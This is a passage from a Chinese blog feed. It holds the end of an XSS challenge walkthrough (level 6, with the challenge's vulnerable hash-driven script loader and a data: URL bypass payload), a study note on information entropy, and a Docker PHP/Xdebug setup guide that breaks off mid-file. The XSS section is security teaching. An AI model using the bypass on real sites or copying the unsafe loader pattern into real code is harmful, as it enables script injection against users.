scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>直接加载外部脚本，如图所示</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>既然没有任何过滤，那就直接用data数据流加载即可</p><p>RFC2397对data数据流有过定义 <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>学习了基本的Cross-site scripting (XSS)</p><p>跨站点脚本（XSS）是一个安全漏洞，可能会影响网站。 这个漏洞可能使攻击者可以将自己的恶意JavaScript代码添加到显示给用户的HTML页面上。 一旦被害者的浏览器访问，此代码便可以执行，改变网站的行为或外观，窃取私人数据或代表用户执行操作等等</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熵和信息的学习</title>
      <link href="article/entropy/"/>
      <url>article/entropy/</url>
      
        <content type="html"><![CDATA[<p>摸鱼的学习总结，搞作品赛必须的理论学习…</p><span id="more"></span><blockquote><p><strong>信息是从多个可能状态中确定实际状态的代价</strong></p></blockquote><p>有些平台的回答挺好的，建议看看参考链接</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>例子：How much is the shirt?</strong></p><p><strong>衬衫的价格是9磅15便士，所以你选择B项，答案却是C项。</strong></p><h2 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h2><p>当一件事情(宏观态)有很多种可能的情况时，这件事情(宏观态)对某人(观察者)而言具体是哪种情况(微观态)的不确定性叫做熵.</p><p>即这(知情情况的不确定性)就是熵</p><img src="/article/entropy/image-20210412143856985.png" class="" title="熵" loading="lazy"><p>而能<strong>消除这种不确定性的事物</strong>就是信息</p><img src="/article/entropy/image-20210412144408346.png" class="" title="信息" loading="lazy"><h2 id="信息量"><a href="#信息量" class="headerlink" title="信息量"></a>信息量</h2><p>熵和信息的增减数量相等，获取信息的同时也会消除不确定性(熵)</p><blockquote><p><strong>消除</strong>熵 &#x3D;&#x3D; <strong>获取</strong>信息</p></blockquote><p>例如在举例中，ABCD四个选项对于不知道最终答案的人来说都是等概率(25%)的，熵在此时(等概率)最大。</p><p>而告诉你答案是C的时候，这时熵最小。</p><p>能够消除熵的信息有三种类型，本质都是能够<strong>正确</strong>的调整每个可能情况的概率。</p><p>如果告诉你<code>&quot;答案是ABCD中的一个&quot;</code>则获取了0bit的信息，这种定义下，没有假信息的说法。只有能消除某人对某事不确定性的事物才叫做信息，即<code>&quot;答案是ABCD中的一个&quot;</code>不是信息</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>而告诉你<code>&quot;A是正确答案&quot;</code>也不是信息(正确答案为C)，因为它不是正确的。</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="类型一：调整概率"><a href="#类型一：调整概率" class="headerlink" title="类型一：调整概率"></a>类型一：调整概率</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中张三得知<code>&quot;有一半可能是C选项&quot;</code>，这个信息将C选项的概率提高到了50%(提供了0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="类型二：排除干扰"><a href="#类型二：排除干扰" class="headerlink" title="类型二：排除干扰"></a>类型二：排除干扰</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中李四得知<code>&quot;B选项是错的&quot;</code>，这个信息直接将B选项概率降低到0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="类型三：确定情况"><a href="#类型三：确定情况" class="headerlink" title="类型三：确定情况"></a>类型三：确定情况</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，王五英语非常好，从这个消息中王五直接得知<code>&quot;C选项是正确的&quot;</code>，这个信息直接将C选项概率提高到100%(2bits)，直接确定了实际情况。</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="信息的接收"><a href="#信息的接收" class="headerlink" title="信息的接收"></a>信息的接收</h2><h3 id="媒介无关"><a href="#媒介无关" class="headerlink" title="媒介无关"></a>媒介无关</h3><p><strong>同一个观察者对同一件事接受到的信息与传递信息的信号模式无关</strong></p><p>王五写纸条给赵六<code>&quot;答案是C&quot;</code>传递的信息是2bits，直接告诉赵六传递的信息也是2bits，打三个响指(与赵六约定好，赵六能够理解)，传递的信息也是2bits</p><h3 id="相对个体"><a href="#相对个体" class="headerlink" title="相对个体"></a>相对个体</h3><p><strong>接收到的信息是相对于观察者已经对该事情的实际了解程度而言的</strong></p><p>王五会这道题，王五对这道题的熵就为0bit，不管王五搞不告诉赵六正确答案是C，因为观察者王五已经拥有这件事的所有信息，即王五确定(知道)这道题的答案是C，不确定性从最初就不存在。</p><p>赵六不会这道题，所以赵六对这道题的熵为2bits，因为观察者赵六没有对于这件事的任何信息。</p><p>对于李四而言，王五告诉张三<code>&quot;答案是C&quot;</code>，提供给李四1.58bits信息，因为观察者李四知道B是错的，观察者拥有关于这件事情的部分信息。</p><p>赵六认为C是错的，再告诉赵六答案是C，熵不会减少，因为没有实际帮助赵六消除事情的不确定性，因为熵不会随着主观臆想而减少，信息也不随主观意识而改变。</p><h3 id="相对事件"><a href="#相对事件" class="headerlink" title="相对事件"></a>相对事件</h3><p><code>&quot;太阳东升西落&quot;</code>，这句话对知道的人提供0bit信息，对知道或东或西升起的人提供了1bit信息，对认为东南西北都可能升起的人提供了2bits信息</p><img src="/article/entropy/image-20210412204545002.png" class="" title="东南西北" loading="lazy"><h2 id="信息量的计算"><a href="#信息量的计算" class="headerlink" title="信息量的计算"></a>信息量的计算</h2><p>信息也是物理量，类似于<code>千克</code>，选种千克为单位物理量，则测量其他物体的质量就是以多少个单位质量，即多少千克来计算。</p><p>信息也是参照单位事件的不确定性，看看待测事件的不确定性相当于”多少个”参照事件的不确定性，其中”多少个”，便是信息量。</p><p>如果选择参照事件像是抛硬币这样50%两种等概率情况的事件时，测量的信息量的单位就称为比特(bit)。</p><p>测量质量是，可以用待测物体质量m除以参照物体质量B，因为待测物体质量m&#x3D;参照物体质量B 乘 参照物体个数n，所以知道总质量m 求 个数 n 时，利用除法计算即可。</p><p>可是测量信息时却不能用除法，因为抛三枚硬币产生的等可能结果并非 $3*2&#x3D;6种$，而是 $2^3&#x3D;8种$</p><p><code>[正正正,正正反,正反正,正反反,反正正,反正反,反反正,反反反]</code></p><p>不是线性关系，而是指数关系，所以当知道可能情况个数m，想求这些情况相当于多少个n参照事件产生的时，就用对数运算即可。</p><p>$$ m &#x3D; 2^n $$</p><p>$$ n &#x3D; log_2m $$</p><p>所以对答案ABCD里哪一选项的不确定性即为<br>$$ log_24 &#x3D; 2 bits $$<br>这种情况因为每个选项都是25%的等概率才可以，与抛硬币一样，出现正反的概率都是相等的50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>可张三知道有一半可能是C选项时，各个情况的概率就不一样了。这时要分别测量待测事件每种可能的信息量后乘它们各自发生的概率再相加即可。</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>不过我们不知道概率为1&#x2F;6的情况的不确定性相当于抛多少个硬币所产生的不确定性，m未知就没法用这个公式</p><p>$$ log_2m_A $$</p><p>但1%会发生的情况相当于从100个等概率情况中确定实际情况，而概率的倒数&#x3D;等概率情况的个数</p><p>$$ p &#x3D; 1&#x2F;100 $$<br>$$ 100 &#x3D; 1&#x2F;p $$</p><p>用概率的倒数1&#x2F;p替换等概率情况个数m后就可以计算每种情况的信息量了</p><p>$$ m &#x3D; 1&#x2F;p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>再将每个情况的信息量乘对应发生的概率再相加，就能算出总信息量了</p><p>$$ P_A: 1&#x2F;6 log_2(6&#x2F;1) &#x3D; 0.43 bits $$</p><p>$$ P_b:1&#x2F;6 log_2(6&#x2F;1) &#x3D; 0.43 bits $$</p><p>$$ P_c:1&#x2F;2 log_2(2&#x2F;1) &#x3D; 0.5 bits $$</p><p>$$ P_d:1&#x2F;6 log_2(6&#x2F;1) &#x3D; 0.43 bits $$</p><p>张三得知<code>&quot;有一半可能是C选项&quot;</code>后的不确定性(熵)为 $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d &#x3D; 1.79 bits $$</p><p>告诉张三<code>&quot;有一半可能是C选项&quot;</code>后提供的信息为 $2-1.79&#x3D;0.21 bits$</p><h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$$ log_2m $$</p><h3 id="一般分布"><a href="#一般分布" class="headerlink" title="一般分布"></a>一般分布</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zhihu.com/question/22178202">知乎:信息熵是什么？</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">微信公众号:超智能体 信息论</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">马猛飞,石乐义,魏东平,徐兴华.基于信息熵的分布式Web服务移动目标防御方案[J].计算机技术与发展,2020,30(10):131-136.</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker-php+mysql配置debug环境</title>
      <link href="article/phpstormdebug/"/>
      <url>article/phpstormdebug/</url>
      
        <content type="html"><![CDATA[<p>记录下之前搭建过程</p><span id="more"></span><h2 id="前置要求："><a href="#前置要求：" class="headerlink" title="前置要求："></a>前置要求：</h2><ol><li>装好phpstorm</li><li>装好docker</li><li>下载docker-compose(可选)</li></ol><p>最后附一键docker-compose搭建方法，可附带mysql，感谢王神指导。</p><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><h3 id="docker进行PHP多版本部署"><a href="#docker进行PHP多版本部署" class="headerlink" title="docker进行PHP多版本部署"></a>docker进行PHP多版本部署</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>随意，要啥版本起啥容器，可以去<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> 看</p><p>参数解释：</p><pre class="language-none"><code class="language-none">-d ： 后台运行-v ： 目录映射，因为我们要把本地目录映射到容器目录本地目录:容器目录</code></pre><h3 id="安装xdebug模块"><a href="#安装xdebug模块" class="headerlink" title="安装xdebug模块"></a>安装xdebug模块</h3><p>安装vim并换源</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \ deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \ deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \ deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span><span class="token operator">></span> /etc/apt/sources.list <span class="token punctuation">\</span><span class="token operator">&amp;&amp;</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">vim</span></code></pre><h4 id="更新一种换源方法，基本上各种系统均有效："><a href="#更新一种换源方法，基本上各种系统均有效：" class="headerlink" title="更新一种换源方法，基本上各种系统均有效："></a><strong>更新一种换源方法，基本上各种系统均有效</strong>：</h4><h5 id="amd"><a href="#amd" class="headerlink" title="amd:"></a>amd:</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu\//g'</span> /etc/apt/sources.list <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/security.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu\//g'</span> /etc/apt/sources.list</code></pre><h5 id="arm-一般为用mac的小伙伴"><a href="#arm-一般为用mac的小伙伴" class="headerlink" title="arm(一般为用mac的小伙伴):"></a>arm(一般为用mac的小伙伴):</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu-ports\//g'</span> /etc/apt/sources.list <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/security.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu-ports\//g'</span> /etc/apt/sources.list</code></pre><p>安装xdebug模块</p><p><code>docker exec -it &lt;id&gt; bash</code>进入容器后</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker-php-ext-install mysqli <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> pecl <span class="token function">install</span> xdebug <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> docker-php-ext-enable xdebug</code></pre><p><strong>注意</strong>：php5.6需要指定版本安装xdebug</p><pre class="language-bash" data-language="bash"><code class="language-bash">RUN docker-php-ext-install mysqli <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> docker-php-ext-install mysql <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> pecl <span class="token function">install</span> xdebug-2.5.0</code></pre><p>运行<code>php -m</code> 发现已经安装好xdebug模块</p><h3 id="修改php-ini"><a href="#修改php-ini" class="headerlink" title="修改php.ini"></a>修改php.ini</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini<span class="token function">vim</span> /usr/local/etc/php/php.ini</code></pre><p>添加</p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>写进去之后重启apache服务 <code>apache2ctl restart</code></p><p>查看phpinfo，访问<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h2><p>php多版本+mysql服务</p><p>目录结构</p><pre class="language-none"><code class="language-none">|docker-compose.yml└--5.6 └-Dockerfile└--7.4 └-Dockerfile</code></pre><p>Docker-compose.yml，如果需要起不同或更多的版本，照着修改yml和Dockerfile即可</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:5.6-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># 自动重启，一般用于开机自启</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># 自设mysql的password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># 由于映射端口，密码需设强密码，否则请关闭端口映射</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:7.4-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6的Dockerfile(此处未使用更新换源方法，如报错或有需要可自行更换)</p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> php:5.6-apache</span><span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span>> /etc/apt/sources.list <span class="token operator">\</span>    &amp;&amp; apt update &amp;&amp; apt install -y vim</span><span class="token instruction"><span class="token keyword">RUN</span> [<span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"echo -e \"xdebug.remote_enable=On\nxdebug.remote_host=host.docker.internal\nxdebug.remote_port=9000\nxdebug.auto_trace=On\nxdebug.collect_vars=On\nxdebug.collect_return=On\nxdebug.collect_params=On\nxdebug.idekey=phpstorm\nxdebug.remote_log='/tmp/xdebug.log'\" >> /usr/local/etc/php/conf.d/myconfig.ini"</span>]</span><span class="token instruction"><span class="token keyword">RUN</span> docker-php-ext-install mysqli <span class="token operator">\</span>    &amp;&amp; docker-php-ext-install mysql <span class="token operator">\</span>    &amp;&amp; pecl install xdebug-2.5.0 \ # 指定xdebug版本</span>    &amp;&amp; docker-php-ext-enable xdebug<span class="token instruction"><span class="token keyword">RUN</span> apache2ctl restart</span></code></pre><p>7.4的dockerfile(此处未使用更新换源方法，如报错或有需要可自行更换)</p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> php:7.4-apache</span><span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span>> /etc/apt/sources.list <span class="token operator">\</span>    &amp;&amp; apt update &amp;&amp; apt install -y vim</span><span class="token instruction"><span class="token keyword">RUN</span> [<span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"echo -e 